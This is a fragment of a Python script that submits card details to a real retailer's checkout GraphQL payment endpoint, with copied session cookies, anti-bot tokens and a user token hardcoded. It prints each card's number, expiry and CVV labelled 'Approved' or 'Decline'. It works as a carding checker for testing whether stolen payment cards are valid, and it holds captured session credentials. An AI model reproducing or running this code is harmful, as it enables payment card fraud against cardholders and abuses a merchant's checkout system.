        '_abck': 'EEBA09C8670DC21B03A27B341764314A~-1~YAAQjcBMaMzIu6OTAQAAGWb0uw3OZSK7DUg/a6RxpQvgmzMPg2RCw7UKS3zalB61tii1VNu2Yy6IqOIS6xeKcNywDACprCU1EDFnYP+cAeqtHX8tuFsPgSHFovZ5u/6JUFBEZv41Pn7LU14sk4toMQxPiJ7UPixVS8N76h2E+ZfVmdr8L3//8x0NutenbKX96Nlzm9Cx0Zt2va6T/DM/hOkpL2i3s8ueSd9OipUvLlsLj+i5f4deFrssT2cfvEa4+26aE3ddInU4rQfzrxWy20QNUVZ5WVw4i/zxEgWW4fP0um8QFsBfxptE4a1oIWrR1dQsmLx5YZ2pQyU27izz+T/8Rd96Io1HeFjMAM3s6apxQjXFpvGZntYmfVO5bivMUijYssehFhisJ9y4CHHOlW9jo1IpMeANG6hWgdyLnWpke5MWQlzuiQOoR9iJFAo2zGo12KBBUqYJSSFCJz3hI6iln52gH8EuDsz72egsK1cKMYUZJcoqJVDZc4HEwUh1RhbDl//tdEKyDWSgC4kIhMhAZZEEih3+4XlnwcpDKGw4WyIHJEn/V8EgJECRzEnZHSF3iEaldvdWZfBPE/+k+hMNIcR/9DxpQhvxQYIFKQwAHwWEVT5Nl+wAkhtPAzQNQjhoiztMn6Ht62i8M0SoA1xT9uNGyk6LpjcGL6MFDaB5athaGGx7J7HbW/EyqWz2xUy6fRX9DKD5jcX+rU4Euq8tHOiA0aoXelng6ZM3ny0/36NzERnAu9OHfSNzPixmrql3zxG/1l0Q+MOFH7LnMm/f0ulpaZg4rEjQqIgNiBdHqAt93VghGCv9J+/j~-1~-1~1734028182',
        'bm_sv': 'BCBC226F6A6089BBC9C546EE5BF1810F~YAAQjcBMaM7Ju6OTAQAALmn0uxo4yoVyODzRgpygw92eUa0sgRI1eT7ezkJeER10WNXWI3s9IMueH3nDvPz38SYkCX6MBXd4QBKKuBQcvgX2BtIRU8vTE2rkmIVCY87yWdD9y9A6rjsG2TOnNirXqsWpla8dF5rj+VfTDtfrSTBoK2lMpDi39zh/jx0yxjcJxQdXvdBifOFXo66BPf5NCGOJNKwUZyzsAbeJw+c1LJ88ot15KlJ8fJh1XuNUskGQguA1Aj/Fhayv~1',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'es-419,es;q=0.9',
        'apollographql-client-name': 'web',
        'apollographql-client-version': '0',
        'client_source': 'tcp-us-web-checkout',
        'content-type': 'application/json',
        # 'cookie': 'iShippingCookie=US|en_US|USD|1.0|1.0; tcpState=FL; tcpSegment=5; tcpGeoLoc=25.7728|-80.1919; tcpZip=33101-33102+33106+33111-33112+33114+33116+33122+33124-33138+33142-33147+33150-33159+33161-33170+33172-33190+33193-33194+33196-33197+33199+33231+33233-33234+33238+33242-33243+33245+33247+33255-33257+33261+33265-33266+33269+33280+33283+33296+33299; tcpCountryDetail=US; AKA_A2=A; feregion=mm-west; origin=macrometa; bm_mi=967EBF04D70C4245B8E8B78985B8E35D~YAAQjcBMaB1QuKOTAQAAB0vruxprU4CXhs1Mo+oHGnnixmSKKZa/qDHaEhSjE7hNf3FUhoTivDMcTbsJnOCmyR4bgPfoiEUjU0+kg1yACfRyQ09tWRgHCf22NhMYve57A6mAY5HAKCh3Gt4GssbLPuxelYpi/47rb2Td7KrBeoCy49Flij+PKVAqraqlUhn0DJLWG2n8IMCDGpOYcsmgJegbgiuOBmC1YOI+/5d55IlT0vQ/GlOr07TIid8THbWbIcHEHZ0zuI6ipxPv2wm4px1skt8tHPaISvFXErWMMo7Q8eZWy6y0fzyeAxnMUU3c7YgT2Red48KRnhz8CT1OGGjo3qo/gqz1uY3eYogfVb9TpQ8=~1; LandingBrand=tcp; _ga=GA1.1.1730604613.1734024620; userToken=eyJ2ZXIiOiIxLjAiLCJqa3UiOiJzbGFzL3Byb2QvYmZ2Zl9wcmQiLCJraWQiOiJmYTM2NDJlZC0wODIxLTQxODQtYjU2ZS03OTBlOWZjZGQwMmIiLCJ0eXAiOiJqd3QiLCJjbHYiOiJKMi4zLjQiLCJhbGciOiJFUzI1NiJ9.eyJhdXQiOiJHVUlEIiwic2NwIjoic2ZjYy5zaG9wcGVyLW15YWNjb3VudC5iYXNrZXRzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzIHNmY2Muc2hvcHBlci1wcm9kdWN0cyBzZmNjLnNob3BwZXItbXlhY2NvdW50LnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMubG9naW4gc2ZjYy5wd2RsZXNzX2xvZ2luIHNmY2Muc2hvcHBlci1teWFjY291bnQub3JkZXJzIHNmY2Muc2hvcHBlci1jdXN0b21lcnMucmVnaXN0ZXIgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzIHNmY2Muc2hvcHBlci1teWFjY291bnQuYWRkcmVzc2VzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucHJvZHVjdGxpc3RzLnJ3IHNmY2Muc2hvcHBlci1wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLXByb21vdGlvbnMgc2ZjYy5zaG9wcGVyLWJhc2tldHMtb3JkZXJzLnJ3IHNmY2Muc2hvcHBlci1teWFjY291bnQucGF5bWVudGluc3RydW1lbnRzLnJ3IHNmY2Muc2hvcHBlci1naWZ0LWNlcnRpZmljYXRlcyBzZmNjLnNob3BwZXItcHJvZHVjdC1zZWFyY2ggc2ZjYy5zaG9wcGVyLW15YWNjb3VudC5wcm9kdWN0bGlzdHMgc2ZjYy5zaG9wcGVyLWNhdGVnb3JpZXMgc2ZjYy5zaG9wcGVyLW15YWNjb3VudCIsInN1YiI6ImNjLXNsYXM6OmJmdmZfcHJkOjpzY2lkOjI0MDI5ZTIzLWMxZDEtNDRlZC1hYmM0LTNiN2M5YWI2Yzk3Mzo6dXNpZDpmYTg2NmIyZC04NTgzLTRlMDctOTc4YS03OTQ3YzQ4OGY2NzAiLCJjdHgiOiJzbGFzIiwiaXNzIjoic2xhcy9wcm9kL2JmdmZfcHJkIiwiaXN0IjoxLCJkbnQiOiIwIiwiYXVkIjoiY29tbWVyY2VjbG91ZC9wcm9kL2JmdmZfcHJkIiwibmJmIjoxNzM0MDI0NjE1LCJzdHkiOiJVc2VyIiwiaXNiIjoidWlkbzpzbGFzOjp1cG46R3Vlc3Q6OnVpZG46R3Vlc3QgVXNlcjo6Z2NpZDpiY3hLYzJsSHhHa0tvUm1iczJrV1lZeHJhMTo6Y2hpZDpQTEFDRV9VUyIsImV4cCI6MTczNDAyNjQ0NSwiaWF0IjoxNzM0MDI0NjQ1LCJqdGkiOiJDMkMxMTUyMjIwODc1MC0xMjI0MDc4MjE0MTI2OTkyNDYwNDA5NjM3NzIifQ.RWSOcsMgaypMDRrpJj4BWilqmfTW7CB4oVKLkPVZchlcAK9g6B_aO19_IlyMohGFXt2Egp047i-Ts-7fGhheaQ; usid=fa866b2d-8583-4e07-978a-7947c488f670; gcid=bcxKc2lHxGkKoRmbs2kWYYxra1; basketId=38c198f4019b9d545ee30202a0; cartItems=SF|00197710368305_1; cartItemsCount=1; amp_365902=IU9zndZtay6wrLrZtwV847...1ietuoior.1ietuoip5.0.2.2; _gcl_au=1.1.1606285197.1734024596.2044620999.1734024689.1734024688; smsSubscriptionStatus=false; subscribedPhoneNumber=null; unsubscribedPhoneNumber=3234231234; pv=6; ak_bmsc=FCB2B16B81709A0BAF37551EFB7FFE31~000000000000000000000000000000~YAAQjcBMaJ9iuqOTAQAAeq3wuxrgR/wdq3y/txk+QcBnv4I6gfyYw7Tu7KXIr7O4fZqxYEKkmqZEnQzNWEq1ijVlgCnU8XXZB/YtKifFq0wtianOn4S9fOMvyl4Qd19zjjIHq4BQjvNXDGBQ/2PyLiLZ6eSE1SgMJr2s3hisNSD8xwBzxpk56UIGZbMlgX7/22USpsZhnTc5hApLGcu3/OCO5DciNZCgWb+XUTVuuM+8z/PFhztMRUI6QD/HY/lEDayCbZVoOZ6ieRKErc8cnI3XJxez2IUQJrU+0udBvKgUTHl7nJ068XWj+/c9NE02PMmmbrG2D2z0nW2jS0IiFxAo1zXYr9yDo1w3GJ/+a8PAV/8p8YieaCKoyHkfZslTmTn9eUrcX3U2kPkaLRXwkfvkaD+iOfNLopxVwnNIRwy5SeFrTtNG+exR+l5nx0poGc9Iv83rQ6DQFBMHpNUZnqhzbBZovz9a+kaYJ2Y+ysyP3UHzsvyefSV2eqTz5MdQFvGhEKdooSxW03nUJVe9aOZ2; _ga_Z18SEZPZ6D=GS1.1.1734024619.1.1.1734025077.60.0.0; bm_sz=7F34158F810F8737FB322BAC18B37DE3~YAAQjcBMaORju6OTAQAAD0LzuxqZdJjlb2JzN0jIeGTNp+/4gFVw42AYaUJAyKpKltWocs++wQh+zcQOct/QT4IFeISoRbyeRcaAch8mQSwlcX82pZ4ejc3d6xpaTS/GybtYKb8KsRsDU9clip68rRNv7JnHToqQN6DvKLqvaR3hzFsfMwq6XSpJR1RAL+CslErhdZXrp1gcFSAMwo6su6ajaJ3QKlmHKzVpBP/tULWLQ/MKWybtA1qX8WPvJ4XZF6NkN/YCH3EEypWHL3pTJmSD7/fECcvyFwAtx3hbKucl/6dB1jzLgUxGPVXggbvyg9fqrGhzohyBNzVSBYBwGfNLF9xg8vtAXgZKMG6sX7BLmbMLCzjIEAkLT1PSnA6tpdueiKRc+h+cqiwgqrStxIzZ+TxTB9qRoStZ9qwsUp8cu8vKKXhldcZsPaTdyLfr+qmLmFrrM3g9N7VGSzCkUZlKW6u4Cg==~4474166~4276791; _abck=EEBA09C8670DC21B03A27B341764314A~-1~YAAQjcBMaMzIu6OTAQAAGWb0uw3OZSK7DUg/a6RxpQvgmzMPg2RCw7UKS3zalB61tii1VNu2Yy6IqOIS6xeKcNywDACprCU1EDFnYP+cAeqtHX8tuFsPgSHFovZ5u/6JUFBEZv41Pn7LU14sk4toMQxPiJ7UPixVS8N76h2E+ZfVmdr8L3//8x0NutenbKX96Nlzm9Cx0Zt2va6T/DM/hOkpL2i3s8ueSd9OipUvLlsLj+i5f4deFrssT2cfvEa4+26aE3ddInU4rQfzrxWy20QNUVZ5WVw4i/zxEgWW4fP0um8QFsBfxptE4a1oIWrR1dQsmLx5YZ2pQyU27izz+T/8Rd96Io1HeFjMAM3s6apxQjXFpvGZntYmfVO5bivMUijYssehFhisJ9y4CHHOlW9jo1IpMeANG6hWgdyLnWpke5MWQlzuiQOoR9iJFAo2zGo12KBBUqYJSSFCJz3hI6iln52gH8EuDsz72egsK1cKMYUZJcoqJVDZc4HEwUh1RhbDl//tdEKyDWSgC4kIhMhAZZEEih3+4XlnwcpDKGw4WyIHJEn/V8EgJECRzEnZHSF3iEaldvdWZfBPE/+k+hMNIcR/9DxpQhvxQYIFKQwAHwWEVT5Nl+wAkhtPAzQNQjhoiztMn6Ht62i8M0SoA1xT9uNGyk6LpjcGL6MFDaB5athaGGx7J7HbW/EyqWz2xUy6fRX9DKD5jcX+rU4Euq8tHOiA0aoXelng6ZM3ny0/36NzERnAu9OHfSNzPixmrql3zxG/1l0Q+MOFH7LnMm/f0ulpaZg4rEjQqIgNiBdHqAt93VghGCv9J+/j~-1~-1~1734028182; bm_sv=BCBC226F6A6089BBC9C546EE5BF1810F~YAAQjcBMaM7Ju6OTAQAALmn0uxo4yoVyODzRgpygw92eUa0sgRI1eT7ezkJeER10WNXWI3s9IMueH3nDvPz38SYkCX6MBXd4QBKKuBQcvgX2BtIRU8vTE2rkmIVCY87yWdD9y9A6rjsG2TOnNirXqsWpla8dF5rj+VfTDtfrSTBoK2lMpDi39zh/jx0yxjcJxQdXvdBifOFXo66BPf5NCGOJNKwUZyzsAbeJw+c1LJ88ot15KlJ8fJh1XuNUskGQguA1Aj/Fhayv~1',
        'devicetype': 'desktop',
        'origin': 'https://www.childrensplace.com',
        'platform': 'SF',
        'priority': 'u=1, i',
        'referer': 'https://www.childrensplace.com/us/checkout',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera GX";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-viewport-width': '707',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'siteid': 'PLACE_US',
        'tcp-trace-request-id': 'CLIENT_1_dc302b39-eb21-4be9-810e-da561eea35a1',
        'tcp-trace-session-id': 'not-available',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'usid_dup': 'fa866b2d-8583-4e07-978a-7947c488f670',
        'x-tcp-channel': '',
    }

    params = {
        'operationName': 'ADD_PAYMENT_INSTRUMENTS',
    }

    json_data = {
        'operationName': 'ADD_PAYMENT_INSTRUMENTS',
        'variables': {
            'billingPayload': {
                'billingAddress': {
                    'firstName': 'grdgrd',
                    'lastName': 'gdrgdrg',
                    'address1': '3234 gtrgrtg',
                    'address2': None,
                    'city': 'Miami',
                    'stateCode': 'FL',
                    'countryCode': 'US',
                    'postalCode': '33132',
                    'c_addressId': 'me',
                    'c_addressType': 'ShippingAndBilling',
                    'c_sameAsShippingAddress': True,
                    'phone': '(323) 423-1234',
                    'c_emailAddress': 'dgdrgr@gmail.com',
                },
                'paymentInstrument': {
                    'sessionId': sessionId,
                    'type': 'CC',
                },
            },
        },
        'extensions': {
            'persistedQuery': {
                'version': 1,
                'sha256Hash': '93e6cf17aa19461fa71960383afc6cecd8ca38af64d4a924843a229580d66f35',
            },
        },
    }

    response = requests.post(
        'https://www.childrensplace.com/federation-gateway/v3/graphql',
        params=params,
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
    try:
        status = "Decline❌"
        if "errors" in response.json():
            message = response.json()["errors"][0]["message"]
        else:
            message = "Approved"
            status = "Approved✅"
        
    except:
        message = response.text
    fin = time.time()
    print(f"{cc}|{mm}|{yy}|{cvv} -- {status} -- {message} -- time({round(fin - ini)}s)")
